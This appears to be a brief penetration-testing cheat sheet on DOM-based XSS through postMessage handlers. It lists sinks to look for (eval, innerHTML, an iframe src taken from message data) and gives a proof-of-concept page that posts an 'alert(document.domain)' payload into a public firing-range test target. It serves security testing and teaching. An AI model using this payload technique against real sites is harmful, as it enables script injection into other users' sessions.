<h1>XSS Dom</h1>
search for:
window.addEventListener('message',
where e is vulnerable
window.addEventListener('message', function(e) {

And functions vulnerables
```js
eval(e)
```
var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d; ACMEplayer.element.src = e.url; | ```js <iframe src=e.url> vulnerable e.url```
```js
innerHTML(e)
```
```js
<iframe id="target" src="https://public-firing-range.appspot.com/dom/toxicdom/postMessage/complexMessageDocumentWriteEval"></iframe>
<script>
    var a = document.getElementById('target');
    a.addEventListener('load',() => {
            target.contentWindow.postMessage({"action":"exec","payload":"alert(document.domain)"},"*")
  })
</script>
```

